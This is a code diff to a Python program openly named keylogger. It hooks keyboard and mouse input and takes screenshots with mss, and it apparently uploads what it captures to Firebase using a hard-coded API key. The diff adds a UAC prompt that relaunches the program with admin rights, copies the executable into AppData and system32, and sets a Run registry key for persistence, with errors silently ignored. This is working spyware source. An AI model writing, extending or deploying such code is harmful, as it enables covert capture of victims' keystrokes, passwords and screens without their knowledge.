@@ -1,3 +1,4 @@
+import ctypes
 import getpass
 import os
 import shutil
@@ -9,6 +10,19 @@ import mss as mss
 from pynput import keyboard, mouse
 from datetime import datetime as date
 import pyrebase
+
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+
+if not is_admin():
+    # Re-run the program with admin rights
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    os._exit(1)
 
 config = {
     'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
@@ -135,17 +149,23 @@ def on_click(x, y, button, pressed):
 
 
 def addToStartup():
-    USER_NAME = getpass.getuser()
-    src = str(os.getcwd()) + '\\keylogger.exe'
-    dst = r'C:\Users\%s\AppData' % USER_NAME
-    shutil.copy2(src, dst)
-    exePath = 'C:\\Users\\%s\\AppData\\keylogger.exe' % USER_NAME  # name of script after making EXE
-    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                         r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
-                         winreg.KEY_SET_VALUE)
-    winreg.SetValueEx(key, 'keylogger', 0,
-                      winreg.REG_SZ, exePath)  # file_path is path of file after coping it
+    try:
+        USER_NAME = getpass.getuser()
+        src = str(os.getcwd()) + '\\keylogger.exe'
+        dst = r'C:\Users\%s\AppData' % USER_NAME
+        shutil.copy2(src, dst)
 
+        dst = r'C:\WINDOWS\system32'
+        shutil.copy2(src, dst)
+
+        exePath = 'C:\\Users\\%s\\AppData\\keylogger.exe' % USER_NAME  # name of script after making EXE
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
+                             winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, 'keylogger', 0,
+                          winreg.REG_SZ, exePath)  # file_path is path of file after coping it
+    except:
+        pass
 
 addToStartup()
 
